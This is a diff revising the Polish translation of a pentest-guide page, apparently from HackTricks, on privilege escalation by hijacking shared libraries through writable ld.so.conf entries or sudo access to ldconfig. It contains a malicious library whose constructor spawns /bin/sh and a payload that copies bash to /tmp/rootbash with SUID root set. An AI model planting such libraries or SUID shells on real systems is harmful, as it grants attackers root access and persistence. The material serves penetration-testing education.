@@ -1,10 +1,10 @@
-# ld.so privesc exploit example
+# Przykład exploita privesc ld.so
 
 {{#include ../../banners/hacktricks-training.md}}
 
 ## Przygotowanie środowiska
 
-W poniższej sekcji znajdziesz kod plików, których użyjemy do przygotowania środowiska
+W poniższej sekcji znajdziesz kod plików, których użyjemy do przygotowania środowiska.
 
 {{#tabs}}
 {{#tab name="sharedvuln.c"}}
@@ -42,12 +42,12 @@ puts("Hi");
 
 1. **Utwórz** te pliki na swojej maszynie w tym samym folderze
 2. **Skompiluj** **library**: `gcc -shared -o libcustom.so -fPIC libcustom.c`
-3. **Skopiuj** `libcustom.so` do `/usr/lib` i odśwież cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (uprawnienia root)
+3. **Skopiuj** `libcustom.so` do `/usr/lib` i odśwież cache: `sudo cp libcustom.so /usr/lib && sudo ldconfig` (root privs)
 4. **Skompiluj** **executable**: `gcc sharedvuln.c -o sharedvuln -lcustom`
 
 ### Sprawdź środowisko
 
-Sprawdź, czy _libcustom.so_ jest **ładowany** z _/usr/lib_ oraz czy możesz **uruchomić** plik binarny.
+Sprawdź, czy _libcustom.so_ jest **ładowane** z _/usr/lib_ oraz czy możesz **wykonać** binary.
 ```
 $ ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffc9a1f7000)
@@ -61,7 +61,7 @@ Hi
 ```
 ### Przydatne polecenia triage
 
-Podczas atakowania rzeczywistego celu sprawdź **dokładną nazwę biblioteki**, której potrzebuje binary, oraz to, co **loader obecnie rozwiązuje**:
+Podczas atakowania rzeczywistego celu sprawdź **dokładną nazwę biblioteki**, której potrzebuje plik binarny, oraz to, co loader **obecnie rozwiązuje**:
 ```bash
 readelf -d ./sharedvuln | grep NEEDED
 ldconfig -p | grep libcustom
@@ -71,26 +71,25 @@ LD_DEBUG=libs ./sharedvuln 2>&1 | grep -E 'find library|trying file'
 ```
 Kilka przydatnych pułapek:
 
-- `sudo echo ... > /etc/ld.so.conf.d/x.conf` zwykle **nie działa**, ponieważ
-przekierowanie jest wykonywane przez bieżący shell. Zamiast tego użyj
+- `sudo echo ... > /etc/ld.so.conf.d/x.conf` zazwyczaj **nie działa**, ponieważ
+przekierowanie jest wykonywane przez bieżącą powłokę. Zamiast tego użyj
 `echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf`.
-- Binaries **SUID/privileged** ignorują `LD_LIBRARY_PATH`/`LD_PRELOAD` w
-**secure-execution mode**, ale katalogi pochodzące z `/etc/ld.so.conf` nadal
-są częścią zaufanej konfiguracji loadera, więc ta błędna konfiguracja nadal
-może wpływać na programy uprzywilejowane.
-- W nowszych wersjach glibc dynamic loader udostępnia również
-`--list-diagnostics`, co jest przydatne do debugowania rozwiązywania cache
-oraz wyboru podkatalogu `glibc-hwcaps`, gdy hijack nie zachowuje się zgodnie
-z oczekiwaniami.
+- Programy binarne **SUID/uprzywilejowane** ignorują
+`LD_LIBRARY_PATH`/`LD_PRELOAD` w **trybie bezpiecznego wykonywania**, ale katalogi
+pochodzące z `/etc/ld.so.conf` nadal są częścią zaufanej konfiguracji loadera, więc
+ta błędna konfiguracja nadal może wpływać na uprzywilejowane programy.<sup>[[1]](#references)</sup>
+- W nowszych wersjach glibc dynamiczny loader udostępnia również
+`--list-diagnostics`, co jest przydatne do debugowania rozwiązywania cache oraz
+wyboru podkatalogu `glibc-hwcaps`, gdy hijack nie działa zgodnie z oczekiwaniami.<sup>[[1]](#references)</sup>
 
 ## Exploit
 
-W tym scenariuszu założymy, że **ktoś utworzył podatny wpis** wewnątrz pliku w _/etc/ld.so.conf/_:
+W tym scenariuszu założymy, że **ktoś utworzył podatny wpis** w pliku znajdującym się w _/etc/ld.so.conf/_:
 ```bash
 echo "/home/ubuntu/lib" | sudo tee /etc/ld.so.conf.d/privesc.conf
 ```
 Podatny folder to _/home/ubuntu/lib_ (do którego mamy dostęp z prawem zapisu).\
-**Pobierz i skompiluj** poniższy kod w tej ścieżce:
+**Pobierz i skompiluj** następujący kod w tym folderze:
 ```c
 // gcc -shared -fPIC -Wl,-soname,libcustom.so -o libcustom.so libcustom.c
 
@@ -106,15 +105,15 @@ puts("I'm the bad library");
 system("/bin/sh");
 }
 ```
-Jeśli oczekujesz, że **root** (lub inne uprzywilejowane konto) uruchomi później podatny plik binarny, zwykle lepiej pozostawić **artefakt należący do root**, zamiast uruchamiać interaktywną powłokę. Na przykład:
+Jeśli oczekujesz, że **root** (lub inne uprzywilejowane konto) wykona później podatny plik binarny, zwykle lepiej pozostawić **artefakt należący do root** zamiast uruchamiać interaktywną powłokę. Na przykład:
 ```c
 system("cp /bin/bash /tmp/rootbash && chmod 4755 /tmp/rootbash");
 ```
 Następnie, po wykonaniu uprzywilejowanej operacji, możesz użyć `/tmp/rootbash -p`.
 
-Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w błędnie skonfigurowanej** ścieżce, musimy poczekać na **reboot** lub na wykonanie przez użytkownika root polecenia **`ldconfig`** (_jeśli możesz wykonać ten binary jako **sudo** lub ma on **suid bit**, będziesz w stanie wykonać go samodzielnie_).
+Teraz, gdy **utworzyliśmy złośliwą bibliotekę libcustom w źle skonfigurowanej** ścieżce, musimy poczekać na **restart** lub na wykonanie przez użytkownika root polecenia **`ldconfig`** (_jeśli możesz wykonać ten plik binarny jako **sudo** lub ma on **suid bit**, będziesz w stanie wykonać go samodzielnie_).
 
-Po wykonaniu tej czynności **ponownie sprawdź**, skąd executable `sharedvuln` ładuje bibliotekę `libcustom.so`:
+Po wykonaniu tej czynności **ponownie sprawdź**, skąd plik wykonywalny `sharedvuln` ładuje bibliotekę `libcustom.so`:
 ```c
 $ldd sharedvuln
 linux-vdso.so.1 =>  (0x00007ffeee766000)
@@ -131,18 +130,18 @@ $ whoami
 ubuntu
 ```
 > [!TIP]
-> Zauważ, że w tym przykładzie nie uzyskaliśmy eskalacji uprawnień, ale modyfikując wykonywane polecenia i **czekając, aż użytkownik root lub inny uprzywilejowany użytkownik wykona podatny plik binarny**, będziemy w stanie przeprowadzić eskalację uprawnień.
+> Zauważ, że w tym przykładzie nie eskalowaliśmy uprawnień, ale modyfikując wykonywane polecenia i **czekając, aż użytkownik root lub inny uprzywilejowany użytkownik wykona podatny plik binarny**, będziemy mogli eskalować uprawnienia.
 
-### Inne błędne konfiguracje - ta sama luka
+### Inne błędne konfiguracje - ta sama vuln
 
-W poprzednim przykładzie sfabrykowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprawnień uprzywilejowanych w pliku konfiguracyjnym znajdującym się w `/etc/ld.so.conf.d/`**.\
-Istnieją jednak inne błędne konfiguracje, które mogą powodować tę samą podatność. Jeśli masz **uprawnienia zapisu** do dowolnego **pliku konfiguracyjnego** znajdującego się w `/etc/ld.so.conf.d`, do folderu `/etc/ld.so.conf.d` lub do pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą podatność i ją wykorzystać.
+W poprzednim przykładzie upozorowaliśmy błędną konfigurację, w której administrator **ustawił folder bez uprzywilejowanych uprawnień wewnątrz pliku konfiguracyjnego w `/etc/ld.so.conf.d/`**.\
+Istnieją jednak inne błędne konfiguracje, które mogą powodować tę samą podatność. Jeśli masz **uprawnienia do zapisu** w dowolnym **pliku konfiguracyjnym** w `/etc/ld.so.conf.d`, w folderze `/etc/ld.so.conf.d` lub w pliku `/etc/ld.so.conf`, możesz skonfigurować tę samą podatność i ją wykorzystać.
 
 ## Exploit 2
 
 **Załóżmy, że masz uprawnienia sudo dla `ldconfig`**.\
-Możesz wskazać `ldconfig`, **skąd ma ładować pliki conf**, więc możemy to wykorzystać, aby zmusić `ldconfig` do ładowania dowolnych folderów.\
-Utwórzmy więc pliki i foldery potrzebne do załadowania `/tmp`:
+Możesz wskazać `ldconfig`, **skąd ma ładować pliki conf**, dzięki czemu możemy wykorzystać to do nakłonienia `ldconfig` do ładowania dowolnych folderów.<sup>[[2]](#references)</sup>\
+Utwórzmy więc pliki i foldery potrzebne do załadowania „/tmp”:
 ```bash
 cd /tmp
 mkdir -p conf
@@ -162,10 +161,9 @@ libc.so.6 => /lib/x86_64-linux-gnu/libc.so.6 (0x00007fcb0738c000)
 ```
 **Jak widać, posiadając uprawnienia sudo do `ldconfig`, można wykorzystać tę samą podatność.**
 
+## Referencje
 
+- [1] [ld.so(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ld.so.8.html)
+- [2] [ldconfig(8) - strona podręcznika Linux](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
 
-## Odnośniki
-
-- [ld.so(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ld.so.8.html)
-- [ldconfig(8) - Linux manual page](https://man7.org/linux/man-pages/man8/ldconfig.8.html)
 {{#include ../../banners/hacktricks-training.md}}
